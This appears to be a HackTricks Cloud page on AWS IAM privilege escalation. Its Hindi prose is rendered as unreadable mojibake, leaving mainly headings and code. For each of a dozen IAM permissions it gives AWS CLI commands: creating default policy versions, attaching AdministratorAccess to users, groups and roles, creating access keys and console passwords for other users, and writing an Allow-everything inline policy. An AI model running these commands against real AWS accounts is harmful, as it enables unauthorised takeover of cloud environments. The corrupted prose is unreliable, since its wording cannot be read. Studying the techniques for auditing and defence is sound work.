# AWS - IAM Privesc

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВ.

</details>

## IAM

IAM рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### `iam:CreatePolicyVersion`

**`iam:CreatePolicyVersion`** рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓рд╛ рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ IAM рдкреЙрд▓рд┐рд╕реА рдХрд╛ **рдирдпрд╛ рд╕рдВрд╕реНрдХрд░рдг рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕ рддрдХ рдЙрдирдХреА рдкрд╣реБрдБрдЪ рд╣реИ**. рдЗрд╕рд╕реЗ рд╡реЗ рдЕрдкрдиреА **рдЦреБрдж рдХреА рдХрд╕реНрдЯрдо рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ. рдирдИ рдкреЙрд▓рд┐рд╕реА рд╕рдВрд╕реНрдХрд░рдг рдмрдирд╛рддреЗ рд╕рдордп, рдЗрд╕реЗ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рдкреНрд░рднрд╛рд╡реА рд╣реЛ**, рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реЛрдЧрд╛ рдХрд┐ `iam:SetDefaultPolicyVersion` рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА, рд▓реЗрдХрд┐рди рдирдИ рдкреЙрд▓рд┐рд╕реА рд╕рдВрд╕реНрдХрд░рдг рдмрдирд╛рддреЗ рд╕рдордп, рдПрдХ рдлреНрд▓реИрдЧ (**`--set-as-default`**) рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛ рдЗрд╕реЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ **рдирдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрд╕реНрдХрд░рдг** рдХреЗ рд░реВрдк рдореЗрдВ рдмрдирд╛рдПрдЧрд╛. рдЙрд╕ рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `iam:SetDefaultPolicyVersion` рдЕрдиреБрдорддрд┐ рдХреА **рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ** рд╣реЛрддреА рд╣реИ.

рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрджрд╛рд╣рд░рдг рдХрдорд╛рдВрдб рдЗрд╕ рддрд░рд╣ рджрд┐рдЦ рд╕рдХрддреА рд╣реИ:
```bash
# Enum
aws iam list-policy-versions --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <VERSION_X>

# Exploitation
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
рдЬрд╣рд╛рдВ `policy.json` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рдЦрд╛рддреЗ рдореЗрдВ рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рдХреЗ рдЦрд┐рд▓рд╛рдл рдХреЛрдИ рднреА рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓рд╛ рдиреАрддрд┐ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╢рд╛рдорд┐рд▓ рд╣реЛрдЧрд╛**ред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рд╕рдм рдХреБрдЫ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ред

### `iam:SetDefaultPolicyVersion`

**`iam:SetDefaultPolicyVersion`** рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓рд╛ рд╣рдорд▓рд╛рд╡рд░ **рдореМрдЬреВрджрд╛ рдиреАрддрд┐ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЙрдкрдпреЛрдЧ рдореЗрдВ рдирд╣реАрдВ рд╣реИрдВ**ред рдпрджрд┐ **рдиреАрддрд┐ рдЬрд┐рд╕ рддрдХ рдЙрдирдХреА рдкрд╣реБрдБрдЪ рд╣реИ** рдХреЗ рд╕рдВрд╕реНрдХрд░рдг **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдирд╣реАрдВ рд╣реИрдВ**, рддреЛ рд╡реЗ рдХрд┐рд╕реА рднреА рдЕрдиреНрдп рдореМрдЬреВрджрд╛ рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="warning" %}
рдпрджрд┐ **рдиреАрддрд┐** рдЬрд┐рд╕рдХрд╛ рдЖрдк рд╕рдВрд╕реНрдХрд░рдг **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд░рд╣реЗ рд╣реИрдВ рд╡рд╣реА рд╣реИ рдЬреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ `SetDefaultPolicyVersion` рдЕрдиреБрдорддрд┐ **рдкреНрд░рджрд╛рди** рдХрд░ рд░рд╣реА рд╣реИ, рдФрд░ **рдирдпрд╛ рд╕рдВрд╕реНрдХрд░рдг рдЙрд╕ рдЕрдиреБрдорддрд┐ рдХреЛ рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ**, рддреЛ рд╣рдорд▓рд╛рд╡рд░ **рдиреАрддрд┐ рдХреЛ рдЙрд╕рдХреА рдореВрд▓ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╡рд╛рдкрд╕ рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдЧрд╛**ред
{% endhint %}

рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрджрд╛рд╣рд░рдг рдХрдорд╛рдВрдб рдЗрд╕ рддрд░рд╣ рджрд┐рдЦ рд╕рдХрддреА рд╣реИ:
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> \
--version-id v2
```
рдЬрд╣рд╛рдВ "v2" рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реА рдиреАрддрд┐ рдХрд╛ рд╕рдВрд╕реНрдХрд░рдг рд╣реИред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдПрдХ рдЕрд▓рдЧ рдиреАрддрд┐ рд╕рдВрд╕реНрдХрд░рдг рд╕реЗрдЯ рдХрд░рдХреЗ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ privesc рдЬреЛ рдЕрдзрд┐рдХ рдЕрдиреБрдорддрд┐рдпрд╛рдВ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### `iam:CreateAccessKey`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдкрд░ **`iam:CreateAccessKey`** рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ AWS рдкрд░рд┐рд╡реЗрд╢ рдореЗрдВ рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП **рдПрдХ рдПрдХреНрд╕реЗрд╕ рдХреА ID рдФрд░ рд╕реАрдХреНрд░реЗрдЯ рдПрдХреНрд╕реЗрд╕ рдХреА рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ**, рдмрд╢рд░реНрддреЗ рдХрд┐ рдЙрдирдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рджреЛ рд╕реЗрдЯ рди рд╣реЛрдВ (рдЬреЛ рдХрд┐ рд╕рд░реНрд╡реЛрддреНрддрдо рдкреНрд░рдерд╛ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдЙрдиреНрд╣реЗрдВ рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП)ред

рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрджрд╛рд╣рд░рдг рдХрдорд╛рдВрдб рдЗрд╕ рддрд░рд╣ рджрд┐рдЦ рд╕рдХрддрд╛ рд╣реИ:
```bash
aws iam create-access-key --user-name <target_user>
```
рдЬрд╣рд╛рдВ target\_user рдХреА рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рд╕реЗрдЯ рдЕрдиреБрдорддрд┐рдпрд╛рдВ рд╣реЛрддреА рд╣реИрдВред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privescред

### `iam:CreateLoginProfile`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдкрд░ `iam:CreateLoginProfile` рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ **рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ** рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд▓реЙрдЧрд┐рди рдкреНрд░реЛрдлрд╛рдЗрд▓ рд╕реЗрдЯрдЕрдк рдирд╣реАрдВ рд╣реИ, рддрд╛рдХрд┐ AWS рдХрдВрд╕реЛрд▓ рдореЗрдВ **рд▓реЙрдЧрд┐рди** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдВред

рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрджрд╛рд╣рд░рдг рдХрдорд╛рдВрдб рдЗрд╕ рддрд░рд╣ рджрд┐рдЦ рд╕рдХрддреА рд╣реИ:
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
рд╡рд╣ рдкрд╛рд╕рд╡рд░реНрдб рдЧрд╛рд░рдВрдЯреА рджреЗрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ **рдЦрд╛рддреЛрдВ рдХреА рдиреНрдпреВрдирддрдо рдкрд╛рд╕рд╡рд░реНрдб рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ** рдХреЛ рдкреВрд░рд╛ рдХрд░реЗрдЧрд╛ред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** "рдХрд┐рд╕реА рднреА" рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privescред

### `iam:UpdateLoginProfile`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдкрд░ **`iam:UpdateLoginProfile`** рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП AWS рдХрдВрд╕реЛрд▓ рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЧрдП рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ **рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ** рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ рд▓реЙрдЧрд┐рди рдкреНрд░реЛрдлрд╛рдЗрд▓ рд╕реЗрдЯрдЕрдк рд╣реИред

рдПрдХ рд▓реЙрдЧрд┐рди рдкреНрд░реЛрдлрд╛рдЗрд▓ рдмрдирд╛рдиреЗ рдХреА рддрд░рд╣, рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрджрд╛рд╣рд░рдг рдХрдорд╛рдВрдб рдЗрд╕ рддрд░рд╣ рджрд┐рдЦ рд╕рдХрддрд╛ рд╣реИ:
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
рдпрд╣ рдкрд╛рд╕рд╡рд░реНрдб рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдпрд╣ **рдЦрд╛рддреЗ рдХреА рдиреНрдпреВрдирддрдо рдкрд╛рд╕рд╡рд░реНрдб рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ** рдХреЛ рдкреВрд░рд╛ рдХрд░реЗрдЧрд╛ред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рд╕реАрдзреЗ "рдХрд┐рд╕реА рднреА" рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкреНрд░рд┐рд╡реЗрд╕реНрдХред

### `iam:UpdateAccessKey`

**`iam:UpdateAccessKey`** рд╡рд╛рд▓рд╛ рд╣рдорд▓рд╛рд╡рд░ **рдирд┐рд╖реНрдХреНрд░рд┐рдп рдПрдХреНрд╕реЗрд╕ рдХреА рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдФрд░ рдЙрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ (рдЙрд╕реЗ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдПрдХреНрд╕реЗрд╕ рдХреА рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП)

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Active --user-name Bob
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рд╕реАрдзреЗ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕реЗрд╕ рдХреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (рдЪрд╛рдмреА рд╣реЛрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ)ред

### `iam:CreateServiceSpecificCredential`

рдпрд╣ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рдФрд░ **рдкрд╛рд╕рд╡рд░реНрдб** **рдЙрддреНрдкрдиреНрди** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕реЗрд╡рд╛ (**CodeCommit рдпрд╛ Amazon Keyspaces** -- Apache Cassandra--) рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдирдП рд╕реЗрд╡рд╛-рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкреНрд░рдорд╛рдг-рдкрддреНрд░ рд╕рдВрдмрджреНрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рдорд╛рди рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд░рдЦрддреЗ рд╣реИрдВ, рд╕рд┐рд╡рд╛рдп рдЗрд╕рдХреЗ рдХрд┐ рд╡реЗ рдХреЗрд╡рд▓ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕реЗрд╡рд╛ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реА рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдкреНрд░рддреНрдпреЗрдХ рд╕рдорд░реНрдерд┐рдд рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рддрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдзрд┐рдХрддрдо рджреЛ рд╕реЗрдЯ рд╕реЗрд╡рд╛-рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкреНрд░рдорд╛рдг-рдкрддреНрд░ рд╣реЛрдирд╛ рд╕рдВрднрд╡ рд╣реИред

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name sofia --service-name codecommit.amazonaws.com
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗрд╡рд╛ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privescред

### `iam:ResetServiceSpecificCredential`

**`iam:CreateServiceSpecificCredential`** рдХреА рддрд░рд╣, рд▓реЗрдХрд┐рди рдирдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдмрдирд╛рдиреЗ рдХреЗ рдмрдЬрд╛рдп, рдПрдХ рдХреЛ рд░реАрд╕реЗрдЯ рдХрд░рдирд╛ред

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id ACCAEXAMPLE123EXAMPLE
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗрд╡рд╛ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ.

### `iam:AttachUserPolicy`

**`iam:AttachUserPolicy`** рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓рд╛ рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдПрдХ рдиреАрддрд┐ рд╕рдВрд▓рдЧреНрди рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕ рддрдХ рдЙрдирдХреА рдкрд╣реБрдБрдЪ рд╣реИ, рдЙрд╕ рдиреАрддрд┐ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рдЬреЛрдбрд╝рддреЗ рд╣реБрдПред

рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрджрд╛рд╣рд░рдг рдХрдорд╛рдВрдб рдЗрд╕ рддрд░рд╣ рджрд┐рдЦ рд╕рдХрддреА рд╣реИ:
```bash
aws iam attach-user-policy --user-name <my_username> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рд╕реАрдзреЗ рдХрд┐рд╕реА рднреА рдЪреАрдЬрд╝ рдХреЗ рд▓рд┐рдП privescред

### `iam:AttachGroupPolicy`

**`iam:AttachGroupPolicy`** рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓рд╛ рд╣рдорд▓рд╛рд╡рд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИ **рдПрдХ рд╕рдореВрд╣ рдХреЗ рд▓рд┐рдП рдиреАрддрд┐ рд╕рдВрд▓рдЧреНрди рдХрд░рдХреЗ** рдЬрд┐рд╕рдХрд╛ рд╡реЗ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИрдВ, рдЙрд╕ рдиреАрддрд┐ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЬреЛрдбрд╝рддреЗ рд╣реБрдПред
```bash
aws iam attach-group-policy --group-name group_i_am_in \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
рдЬрд╣рд╛рдВ рд╕рдореВрд╣ рд╡рд╣ рд╕рдореВрд╣ рд╣реИ рдЬрд┐рд╕рдХрд╛ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рд╕реАрдзреЗ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рдХрд┐рд╕реА рднреА рдЪреАрдЬрд╝ рдХреЗ рд▓рд┐рдП (рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд┐рд╕реА рд╕рдореВрд╣ рдХреЗ рдЕрдВрджрд░ рд╣реИ)ред

### `iam:AttachRolePolicy`, ( `sts:AssumeRole`|`iam:createrole`)

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **`iam:AttachRolePolicy`** рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ рдЙрд╕ рднреВрдорд┐рдХрд╛ рдореЗрдВ рдПрдХ рдиреАрддрд┐ **рд╕рдВрд▓рдЧреНрди рдХрд░рдХреЗ** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕ рддрдХ рдЙрдирдХреА рдкрд╣реБрдБрдЪ рд╣реИ, рдЙрд╕ рдиреАрддрд┐ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЬреЛрдбрд╝рддреЗ рд╣реБрдПред
```bash
aws iam attach-role-policy --role-name <role_i_can_assume> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
рдЬрд╣рд╛рдВ рднреВрдорд┐рдХрд╛ рдПрдХ рдРрд╕реА рднреВрдорд┐рдХрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `sts:AssumeRole` рдХреЗ рд╕рд╛рде рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдорд╛рди рд╕рдХрддрд╛ рд╣реИред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рд╕реАрдзреЗ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рдХреБрдЫ рднреА рдХреЗ рд▓рд┐рдПред

### `iam:PutUserPolicy`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ `iam:PutUserPolicy` рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдЗрдирд▓рд╛рдЗрди рдиреАрддрд┐ рдмрдирд╛рдХрд░ рдпрд╛ рдЕрдкрдбреЗрдЯ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИ** рдЬрд┐рд╕ рддрдХ рдЙрдирдХреА рдкрд╣реБрдБрдЪ рд╣реИ, рдЙрд╕ рдиреАрддрд┐ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рдЬреЛрдбрд╝рддреЗ рд╣реБрдПред
```bash
aws iam put-user-policy --user-name <my_username> --policy-name "my_inline_policy" \
--policy-document "file:///path/to/administrator/policy.json"
```
рдЖрдк рдПрдХ рдиреАрддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
